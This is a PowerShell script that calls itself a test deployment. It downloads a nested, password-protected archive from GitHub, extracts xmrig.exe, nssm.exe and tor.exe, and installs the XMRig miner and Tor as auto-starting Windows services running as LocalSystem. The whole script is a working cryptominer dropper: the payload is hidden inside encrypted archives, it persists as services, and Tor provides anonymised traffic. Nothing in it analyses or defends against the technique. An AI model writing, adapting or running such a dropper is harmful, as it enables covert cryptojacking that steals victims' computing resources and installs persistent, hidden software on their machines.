# ============================================
# TEST DEPLOYMENT SCRIPT WITH SERVICE INSTALL
# NO FANCY FORMATTING - PLAIN TEXT ONLY
# ============================================

# CONFIGURATION
$Red7zUrl = "https://raw.githubusercontent.com/flanker411/logs/refs/heads/main/red.7z"
$DecryptionPassword = "red"
$ServiceNameXMRig = "TestMinerService"
$ServiceNameTor = "TestTorService"

Write-Host "=========================================="
Write-Host "TESTING GITHUB DEPLOYMENT WITH SERVICES"
Write-Host "=========================================="
Write-Host ""
Write-Host "Download URL: $Red7zUrl"
Write-Host ""

# Check if running as Admin
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERROR: Not running as Administrator. Right-click PowerShell and select Run as Administrator."
    pause
    exit 1
}

# Create test directory
$TestDir = "$env:TEMP\miner_test_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TestDir -ItemType Directory -Force | Out-Null
Write-Host "[*] Test directory: $TestDir"

# Download red.7z
$Red7zLocal = "$TestDir\red.7z"
Write-Host ""
Write-Host "[1] Downloading red.7z from GitHub..."

try {
    Invoke-WebRequest -Uri $Red7zUrl -OutFile $Red7zLocal -UseBasicParsing
    Write-Host "[SUCCESS] Download successful! Size: $((Get-Item $Red7zLocal).Length) bytes"
} catch {
    Write-Host "[FAILED] Download failed"
    pause
    exit 1
}

# Download 7za.exe bootstrap
Write-Host ""
Write-Host "[2] Getting 7za.exe..."

$Bootstrap7z = "$TestDir\7za.exe"
if (-not (Test-Path $Bootstrap7z)) {
    $SevenZipUrl = "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe"
    try {
        Invoke-WebRequest -Uri $SevenZipUrl -OutFile $Bootstrap7z -UseBasicParsing
        Write-Host "[SUCCESS] Downloaded bootstrap 7za.exe"
    } catch {
        Write-Host "[FAILED] Cannot download 7za.exe"
        pause
        exit 1
    }
}

# Extract red.7z
Write-Host ""
Write-Host "[3] Extracting red.7z..."
$ExtractDir = "$TestDir\red_extracted"
New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null

& $Bootstrap7z x -y -o"$ExtractDir" $Red7zLocal | Out-Null

if ($LASTEXITCODE -eq 0) {
    Write-Host "[SUCCESS] red.7z extracted successfully"
} else {
    Write-Host "[FAILED] Failed to extract red.7z"
    pause
    exit 1
}

# Find grey.7z
Write-Host ""
Write-Host "[4] Looking for grey.7z..."

$Grey7z = Get-ChildItem -Path $ExtractDir -Recurse -Filter "*.7z" | Where-Object { $_.Name -ne "red.7z" } | Select-Object -First 1 -ExpandProperty FullName

if ($Grey7z) {
    Write-Host "[SUCCESS] Found grey.7z at: $Grey7z"
} else {
    Write-Host "[FAILED] Could not find grey.7z"
    pause
    exit 1
}

# Decrypt and extract grey.7z
Write-Host ""
Write-Host "[5] Decrypting and extracting grey.7z..."

$PayloadDir = "$TestDir\payload"
New-Item -Path $PayloadDir -ItemType Directory -Force | Out-Null

& $Bootstrap7z x -y -p"$DecryptionPassword" -o"$PayloadDir" $Grey7z | Out-Null

if ($LASTEXITCODE -eq 0) {
    Write-Host "[SUCCESS] grey.7z decrypted and extracted successfully"
} else {
    Write-Host "[FAILED] Failed to decrypt grey.7z"
    pause
    exit 1
}

# Verify critical files
Write-Host ""
Write-Host "[6] Verifying payload..."

$NSSM = "$PayloadDir\nssm.exe"
$XMRig = "$PayloadDir\xmrig.exe"

if (Test-Path $XMRig) {
    Write-Host "[OK] xmrig.exe found"
} else {
    Write-Host "[MISSING] xmrig.exe NOT FOUND"
    pause
    exit 1
}

if (Test-Path $NSSM) {
    Write-Host "[OK] nssm.exe found"
} else {
    Write-Host "[MISSING] nssm.exe NOT FOUND"
    pause
    exit 1
}

# ============================================
# SERVICE INSTALLATION SECTION
# ============================================

Write-Host ""
Write-Host "=========================================="
Write-Host "INSTALLING SERVICES"
Write-Host "=========================================="

# Stop and remove existing services if they exist
Write-Host ""
Write-Host "[7] Removing existing services..."

& $NSSM stop $ServiceNameXMRig 2>$null
Start-Sleep -Seconds 2
& $NSSM remove $ServiceNameXMRig confirm 2>$null

& $NSSM stop $ServiceNameTor 2>$null
Start-Sleep -Seconds 2
& $NSSM remove $ServiceNameTor confirm 2>$null

Write-Host "[OK] Existing services removed"

# Install XMRig service
Write-Host ""
Write-Host "[8] Installing XMRig service: $ServiceNameXMRig"

& $NSSM install $ServiceNameXMRig $XMRig
Start-Sleep -Seconds 1

& $NSSM set $ServiceNameXMRig AppDirectory $PayloadDir
& $NSSM set $ServiceNameXMRig AppPriority IDLE
& $NSSM set $ServiceNameXMRig Start SERVICE_AUTO_START
& $NSSM set $ServiceNameXMRig ObjectName LocalSystem
& $NSSM set $ServiceNameXMRig Type SERVICE_WIN32_OWN_PROCESS
& $NSSM set $ServiceNameXMRig DisplayName "Test Mining Service"
& $NSSM set $ServiceNameXMRig Description "Test service for mining deployment"

& $NSSM start $ServiceNameXMRig

if ($LASTEXITCODE -eq 0) {
    Write-Host "[SUCCESS] XMRig service installed and started"
} else {
    Write-Host "[FAILED] Failed to start XMRig service"
}

# Install Tor service if tor.exe exists
$TorExe = "$PayloadDir\tor.exe"
if (Test-Path $TorExe) {
    Write-Host ""
    Write-Host "[9] Installing Tor service: $ServiceNameTor"

    & $NSSM install $ServiceNameTor $TorExe
    Start-Sleep -Seconds 1

    & $NSSM set $ServiceNameTor AppDirectory $PayloadDir
    & $NSSM set $ServiceNameTor AppPriority IDLE
    & $NSSM set $ServiceNameTor Start SERVICE_AUTO_START
    & $NSSM set $ServiceNameTor ObjectName LocalSystem
    & $NSSM set $ServiceNameTor Type SERVICE_WIN32_OWN_PROCESS
    & $NSSM set $ServiceNameTor DisplayName "Test Tor Service"
    & $NSSM set $ServiceNameTor Description "Test Tor service for mining deployment"

    & $NSSM start $ServiceNameTor

    if ($LASTEXITCODE -eq 0) {
        Write-Host "[SUCCESS] Tor service installed and started"
    } else {
        Write-Host "[FAILED] Failed to start Tor service"
    }
} else {
    Write-Host ""
    Write-Host "[9] Tor.exe not found - skipping Tor service"
}

# ============================================
# VERIFY SERVICES ARE RUNNING
# ============================================

Write-Host ""
Write-Host "=========================================="
Write-Host "SERVICE STATUS"
Write-Host "=========================================="

Write-Host ""
$xmrigStatus = & sc query $ServiceNameXMRig | findstr STATE
Write-Host "$ServiceNameXMRig : $xmrigStatus"

if (Test-Path $TorExe) {
    $torStatus = & sc query $ServiceNameTor | findstr STATE
    Write-Host "$ServiceNameTor : $torStatus"
}

# ============================================
# SUMMARY
# ============================================

Write-Host ""
Write-Host "=========================================="
Write-Host "DEPLOYMENT COMPLETE"
Write-Host "=========================================="
Write-Host ""
Write-Host "Services installed:"
Write-Host "  - $ServiceNameXMRig (XMRig Miner)"
if (Test-Path $TorExe) {
    Write-Host "  - $ServiceNameTor (Tor Proxy)"
}
Write-Host ""
Write-Host "Installation directory: $PayloadDir"
Write-Host "Test files saved in: $TestDir"
Write-Host ""
Write-Host "Commands to manage services:"
Write-Host "  Start: nssm start $ServiceNameXMRig"
Write-Host "  Stop:  nssm stop $ServiceNameXMRig"
Write-Host "  Remove: nssm remove $ServiceNameXMRig confirm"
Write-Host ""
Write-Host "To stop all test services before deleting folder:"
Write-Host "  nssm stop $ServiceNameXMRig"
if (Test-Path $TorExe) {
    Write-Host "  nssm stop $ServiceNameTor"
}
Write-Host "  nssm remove $ServiceNameXMRig confirm"
if (Test-Path $TorExe) {
    Write-Host "  nssm remove $ServiceNameTor confirm"
}
Write-Host ""
pause